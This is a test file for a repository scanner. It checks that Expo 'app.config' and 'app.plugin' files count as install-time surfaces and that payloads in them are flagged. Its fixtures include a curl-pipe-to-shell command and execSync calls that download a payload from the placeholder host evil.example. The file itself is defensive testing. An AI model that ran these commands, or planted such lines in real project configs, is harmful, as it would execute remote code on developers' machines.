import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an Expo config is an install surface", () => {
  // `@expo/config` resolves the dynamic config as app.config.<ext> in
  // exactly these spellings and evaluates it — transpiling it and even
  // calling an exported function — whenever the CLI loads the project
  // configuration, so the file is build-time code like a Makefile. It
  // keeps the source surface it already had; the name alone decides,
  // for every spelling the resolver accepts and wherever the project
  // root sits.
  for (const path of [
    "app.config.js",
    "app.config.ts",
    "app.config.mjs",
    "app.config.cjs",
    "app.config.mts",
    "app.config.cts",
    "packages/app/app.config.ts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The `.json` spelling is not one of them: Expo resolves it as the
  // static config and reads it with a JSON parser instead of
  // evaluating it, and `app.json` is data the same way, so both stay
  // source alone.
  expect(surfacesOf("app.config.json")).toEqual(["source"]);
  expect(surfacesOf("app.json")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("app.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["app.config.js:unsafe-execution:high"]);
});

test("an install-time download inside an Expo config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch Expo would have run while loading
  // the project configuration.
  const inspection = inspected(
    "app.config.ts",
    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an Expo config plugin is an install surface", () => {
  // `@expo/config` calls `withConfigPlugins` on every config load, and
  // `@expo/config-plugins` resolves `<package>/app.plugin` over the
  // same six spellings as the dynamic config and evaluates the file —
  // including TypeScript entries — so a plugin runs on the same path
  // as `app.config.<ext>` whenever the CLI loads the project
  // configuration. A static `app.json` naming the package is enough to
  // run it, so the name alone decides, wherever the package sits.
  for (const path of [
    "app.plugin.js",
    "app.plugin.ts",
    "app.plugin.mjs",
    "app.plugin.cjs",
    "app.plugin.mts",
    "app.plugin.cts",
    "packages/my-plugin/app.plugin.js",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The `.json` spelling is not one of them: the plugin resolver never
  // probes it, so it stays source alone.
  expect(surfacesOf("app.plugin.json")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  // the same bytes in `app.config.ts` record a download and a finding,
  // and in the plugin they recorded nothing before this classification.
  const inspection = inspected(
    "packages/my-plugin/app.plugin.js",
    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Expo config keeps no finding", () => {
  const inspection = inspected(
    "app.config.js",
    "module.exports = { expo: { name: 'demo', slug: 'demo', version: '1.0.0' } };\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
